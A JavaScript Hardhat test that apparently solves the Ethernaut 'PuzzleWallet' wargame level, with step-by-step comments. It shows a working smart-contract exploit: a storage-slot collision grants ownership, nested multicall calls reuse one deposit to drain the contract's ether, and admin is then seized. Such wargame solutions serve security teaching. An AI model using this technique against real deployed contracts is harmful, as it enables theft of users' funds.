const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel, abiEncodeWithSignature } = require("./utils");

describe("PuzzleWallet", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("PuzzleWallet", player.address, ethers.utils.parseEther("0.001"));
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        instance = instance.connect(player);

        // This was the most difficult and challenging so far

        // First, fix the `instance` variable - add the proxy abi
        const proxyABI = (await ethers.getContractFactory("PuzzleProxy")).attach(instance.address);
        instance = { ...instance, ...proxyABI };

        // `pendingAdmin` and `owner` are actually pointing to the same slot in storage (the first slot)
        // so by proposing a new admin we are actually setting the owner to our address
        await instance.proposeNewAdmin(player.address);
        expect(await instance.owner()).to.equal(player.address);

        // Now we should have access to the `addToWhitelist` function
        await instance.addToWhitelist(player.address);

        // So now the interesting part
        // Our goal is to set the player's address to the `admin` variable
        // Similar to the case with `pendingAdmin` and `owner`, `admin` and `maxBalance` also point to a single storage slot
        // In order to set the `maxBalance` to out player's address, we should obtain access to the `setMaxBalance` function
        // This can be achieved by emptying the contract's ether balance
        // There is only one place where this could be possible - on line 82 where am external call (with value) is made
        // The problem is in the `balances` mapping that won't allow us to send out more than we have deposited
        // So we should think of a way to trick this...

        // One option may be to call the `deposit` function 2 times through the `multicall`
        // Sounds perfect, but wait a second...
        // Yeah, OpenZeppelin devs are too smart. They have predicted this one and have added the `depositCalled` variable check

        // Well, there must be a way to hack it, right?

        // But how...

        // :thinking:

        // Found it!

        // We can recursively call the `multicall` two times and then call the `deposit` function from each nested `multicall`
        // That way:
        //  1. the `msg.value` will stay the same through the whole txn
        //  2. the `depositCalled` will reset on each nested `multicall`
        //  3. the `deposit` function will get tricked because of reusing the msg.value for 2 deposits

        // Let's try it out

        const nestedMulticallData = abiEncodeWithSignature(
            "function multicall(bytes[])",
            [
                abiEncodeWithSignature(
                    "function deposit()"
                )
            ]
        );

        const depositAmount = ethers.utils.parseEther("0.001");

        await instance.multicall([nestedMulticallData, nestedMulticallData], { value: depositAmount });

        // Let's check if it worked
        expect(await ethers.provider.getBalance(instance.address)).to.equal(depositAmount.mul(2));
        expect(await instance.balances(player.address)).to.equal(depositAmount.mul(2));

        // Execute a transaction that send all the contract's ether balance out
        await instance.execute(player.address, await ethers.provider.getBalance(instance.address), "0x00");

        // Check if we succeeded
        expect(await ethers.provider.getBalance(instance.address)).to.equal(ethers.constants.Zero);

        // Finally, set the `maxBalance` (the `admin`) to player's address
        await instance.setMaxBalance(ethers.BigNumber.from(player.address));
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});